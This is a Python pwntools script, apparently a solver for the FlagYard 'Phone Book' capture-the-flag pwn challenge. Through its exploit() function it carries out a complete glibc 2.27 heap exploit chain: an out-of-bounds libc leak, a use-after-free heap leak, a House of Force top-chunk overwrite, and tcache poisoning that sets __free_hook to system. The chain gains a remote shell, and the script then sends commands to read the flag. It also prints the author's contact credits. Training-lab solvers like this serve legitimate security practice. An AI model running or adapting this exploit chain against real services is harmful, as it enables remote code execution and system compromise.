#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PHONE BOOK  -  FlagYard Pwn solver

phone_book (FlagYard Training Labs, Pwn / SAFCSP) - 8-op wrapped House of
Force -> tcache entries poison -> __free_hook = system. glibc 2.27
(Ubuntu 2.27-3ubuntu1.6) offsets hardcoded. Needs pwntools only.

Target is given as host:port (default tcp.flagyard.com:29072).
"""
from __future__ import annotations

from pwn import *
import re
import sys
import time
from pathlib import Path

# ---------------------------------------------------------------------------
# coloured output (same design as the other FlagYard solvers)
# ---------------------------------------------------------------------------
class C:
    RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"
    RED = "\033[31m"; GREEN = "\033[32m"; YELLOW = "\033[33m"
    BLUE = "\033[34m"; MAGENTA = "\033[35m"; CYAN = "\033[36m"; GRAY = "\033[90m"
    WHITE = "\033[97m"

def enable_vt():
    if sys.platform == "win32":
        try:
            import ctypes
            k32 = ctypes.windll.kernel32
            mode = ctypes.c_uint()
            h = k32.GetStdHandle(-11)
            k32.GetConsoleMode(h, ctypes.byref(mode))
            k32.SetConsoleMode(h, mode.value | 0x0004)
        except Exception:
            pass
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

def bar(frac):
    w = 20
    f = max(0.0, min(1.0, frac))
    full = int(round(f * w))
    return "[%s%s] %5.1f%%" % ("\u2588" * full, "\u2591" * (w - full), f * 100.0)

def step(msg, icon="\u25b6", color=C.CYAN):
    print("  %s%s %s%s%s" % (C.BOLD + color + icon + " ",
                             C.DIM, C.BOLD, msg, C.RESET), flush=True)

def ok(msg):
    step(msg, icon="\u2713", color=C.GREEN)

def tick(frac, msg):
    """single moving progress line (updates in place via carriage return)."""
    line = ("%s%s %s %s%s%s" %
            (C.BOLD + C.YELLOW + "\u25b6 ",
             C.CYAN + bar(frac) + C.RESET,
             C.DIM, C.BOLD, msg, C.RESET))
    sys.stdout.write("\r  " + line + "   ")
    sys.stdout.flush()

def fail(msg):
    print("  %s\u2717 %s%s%s" % (C.RED, C.BOLD, msg, C.RESET), flush=True)

def banner():
    print(C.MAGENTA + C.BOLD)
    print("  " + "\u2554" + "\u2550" * 58 + "\u2557")
    for t in ("P H O N E   B O O K   S O L V E R",
              "House of Force -> tcache poison -> __free_hook -> flag"):
        l = (58 - len(t)) // 2
        print("  \u2551" + " " * l + t + " " * (58 - len(t) - l) + "\u2551")
    print("  \u255a" + "\u2550" * 58 + "\u255d")
    print(C.RESET)

# ---------------------------------------------------------------------------
# result panel (fixed-width frame) + author credits
# ---------------------------------------------------------------------------
W = 58
_TG = "\033[1;38;2;0;136;204m"
_OSC_END = "\x1b]8;;\x1b\\"

def _osc(url, color):
    return "\x1b]8;;%s\x1b\\%s" % (url, color)

def _row(segs):
    out = "  \u2551"
    for t, pre, post in segs:
        if pre:
            out += pre + t + (post or "") + C.RESET
        else:
            out += t
    out += " " * (W - sum(len(t) for t, _, _ in segs)) + "\u2551"
    print(out)

def _credits():
    print("  " + "\u2560" + "\u2550" * W + "\u2563")
    _row([("   made with ", C.GREEN, ""), ("\u2764", "\033[1;31m", ""),
          ("  by  ", C.GREEN, ""), ("Fares Badaj", C.BOLD + C.WHITE, "")])
    _row([("   Red Team Operator | Penetration Tester Specialist", C.DIM + C.CYAN, "")])
    print("  " + "\u2560" + "\u2550" * W + "\u2563")
    _row([("   Telegram  \u203a  ", "", ""),
          ("@ptok3", _osc("https://t.me/ptok3", _TG), _OSC_END),
          ("      t.me/ptok3", C.DIM + C.GRAY, "")])
    _row([("   GitHub    \u203a  ", "", ""),
          ("github.com/FaresBadaj", _osc("https://github.com/FaresBadaj", "\033[1;36m"), _OSC_END)])
    _row([("   LinkedIn  \u203a  ", "", ""),
          ("linkedin.com/in/FaresBadaj", _osc("https://www.linkedin.com/in/FaresBadaj", "\033[1;34m"), _OSC_END)])
    _row([("   Credly    \u203a  ", "", ""),
          ("credly.com/users/faresbadaj", _osc("https://www.credly.com/users/faresbadaj", "\033[1;33m"), _OSC_END)])
    print("  " + "\u255a" + "\u2550" * W + "\u255d")

def big_flag(flag, chrono):
    print()
    head = "\u2605  FLAG RECOVERED  \u2605"
    print("  " + "\u2554" + "\u2550" * W + "\u2557")
    _row([("", "", "")])
    _row([(" " * ((W - len(head)) // 2), "", ""), (head, C.BOLD + C.YELLOW, "")])
    _row([("", "", "")])
    _row([(" " * 6, "", ""), (flag, C.BOLD + C.GREEN, "")])
    _row([(" " * 10, "", ""), ("elapsed %.1f s" % chrono, C.DIM + C.CYAN, "")])
    _row([("", "", "")])
    _credits()
    print()

# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------
def ask_target(argv):
    if len(argv) > 1 and (argv[1].startswith("http") or ":" in argv[1]):
        return argv[1].strip()
    raw = input("  Enter the Phone Book challenge target (host:port): ").strip()
    return raw or "tcp.flagyard.com:29072"

def parse_target(raw):
    raw = raw.replace("tcp://", "").replace("http://", "").rstrip("/")
    if ":" in raw:
        host, port_s = raw.rsplit(":", 1)
    else:
        host, port_s = raw, "29072"
    return host, int(port_s)

# ---------------------------------------------------------------------------
# glibc 2.27 offsets (Ubuntu 2.27-3ubuntu1.6)
# ---------------------------------------------------------------------------
OFF_STDOUT    = 0x3ec760    # _IO_2_1_stdout_
OFF_SYSTEM    = 0x4f420     # system
OFF_FREE_HOOK = 0x3ed8e8    # __free_hook

def to_signed(u):
    u &= (1 << 64) - 1
    return u if u < (1 << 63) else u - (1 << 64)

# ---------------------------------------------------------------------------
# interaction helpers
# ---------------------------------------------------------------------------
def menu(io, c):
    io.sendlineafter(b">> ", str(c).encode())

def add(io, sz, phone, name=None, skip_name=False):
    menu(io, 1)
    io.sendlineafter(b"size: ", str(sz).encode())
    io.sendafter(b"number: ", phone)
    io.recvuntil(b"name: ")
    if skip_name:
        return
    io.send(name if name is not None else b"X")

def pr(io, idx):
    menu(io, 2)
    io.sendlineafter(b"index: ", str(idx).encode())
    io.recvuntil(b"name: ")
    name = io.recvuntil(b"\n", drop=True)
    io.recvuntil(b"number: ")
    num = io.recvuntil(b"\n", drop=True)
    return name, num

def delete(io, idx):
    menu(io, 3)
    io.sendlineafter(b"index: ", str(idx).encode())

def connect(host, port):
    for _ in range(5):
        try:
            io = remote(host, port, timeout=10)
            io.recvuntil(b"welcome", timeout=10)
            return io
        except Exception:
            time.sleep(2)
    return None

# ---------------------------------------------------------------------------
# exploit
# ---------------------------------------------------------------------------
def exploit(host, port):
    io = connect(host, port)
    if io is None:
        fail("could not connect to service")
        return None

    # 1) print(-8) -> libc leak via GOT read of stdout FILE struct
    step("leaking libc via print index -8 (read@GOT -> stdout FILE)")
    name, _ = pr(io, -8)
    leak = u64(name.ljust(8, b"\x00")[:8])
    if len(name) < 5:
        fail("libc leak too short")
        io.close(); return None
    base = (leak - leak % 0x1000) - (OFF_STDOUT - OFF_STDOUT % 0x1000)
    fh = base + OFF_FREE_HOOK
    system = base + OFF_SYSTEM
    if base & 0xFFF:
        fail("libc base unaligned: 0x%x" % base)
        io.close(); return None
    ok("libc base = %s   free_hook = %s   system = %s" %
       (C.YELLOW + hex(base) + C.RESET, C.YELLOW + hex(fh) + C.RESET,
        C.YELLOW + hex(system) + C.RESET))

    # 2) add(0x68): name overflow => TOP chunk size = -1  (House of Force)
    step("overflowing name to poison TOP chunk size = -1 (HoF)")
    add(io, 0x68, b"0 ", b"A" * 0x58 + p64(0) + p64(0xFFFFFFFFFFFFFFFF))
    # 3) free chunk 0 -> tcache idx5, key field = heap pointer
    delete(io, 0)
    # 4) UAF print -> heap leak
    step("freed chunk 0 (tcache idx 5), UAF print for heap leak")
    name, _ = pr(io, 0)
    heap = u64(name.ljust(8, b"\x00")[:8]) - 0x10
    ok("heap base = %s" % (C.YELLOW + hex(heap) + C.RESET))
    top = heap + 0x2C0

    # 5) wrap HoF: gap so a fresh malloc lands user ptr at heap+0x50 (tcache region)
    step("wrapping House of Force (signed %#llx gap)..." % to_signed((heap + 0x50 - 32 - top) % (1 << 64)))
    target = heap + 0x50
    evil = (target - 32 - top) % (1 << 64)
    add(io, to_signed(evil), b"0 ", skip_name=True)
    ok("TOP wraps around; next malloc lands in the tcache entries zone")

    # 6) land chunk whose USER area == tcache entries; phone=/bin/sh, name poisons entries[5]
    binsh = u64(b"/bin/sh\x00")
    payload = b"\x00" * 32 + p64(fh)
    step("landing chunk on tcache entries: poison entries[5] = __free_hook")
    add(io, 0x48, str(binsh).encode() + b" ", payload)
    ok("tcache poisoned \u2014 malloc(0x68) will now return __free_hook")

    # 7) malloc(0x68) -> __free_hook; phone = system address
    step("malloc(0x68) returns __free_hook; writing system there")
    add(io, 0x68, str(system).encode() + b" ", skip_name=True)
    ok("__free_hook = system")

    # 8) free(land chunk) -> __free_hook("/bin/sh") == system("/bin/sh") -> shell
    step("free() -> __free_hook(\"/bin/sh\") -> spawning shell")
    delete(io, 1)
    time.sleep(0.5)

    io.sendline(b"echo PWNED")
    io.sendline(b"cat flag 2>/dev/null || cat flag.txt 2>/dev/null || ls")
    data = io.recvrepeat(3)
    io.close()

    m = re.search(rb"FlagY\{[^}]+\}", data)
    if m:
        ok("shell spawned \u2014 flag read!")
        return m.group(0).decode()
    if b"PWNED" in data or b"uid=" in data:
        return "SHELL OK but flag not seen; raw=%r" % data[:300]
    return "FAILED; raw=%r" % data[:300]


def main() -> None:
    t0 = time.time()
    enable_vt()
    banner()
    context.log_level = "error"

    try:
        raw = ask_target(sys.argv)
    except Exception:
        fail("no challenge target given")
        return
    host, port = parse_target(raw)
    step("target host %s:%d" % (host, port))

    step("connecting to the service")
    flag = exploit(host, port)
    if flag and flag.startswith("FlagY"):
        tick(0.85, "shell spawned and flag read")
        print()
        ok("FLAG = %s" % flag)

        big_flag(flag, time.time() - t0)
        outp = Path(__file__).resolve().parent / "flag_from_phone_book.txt"
        outp.write_text(flag + "\n", encoding="utf-8")
        print("  %s[+] saved to %s%s" % (C.GREEN, outp, C.RESET))
    else:
        fail(str(flag))


if __name__ == "__main__":
    main()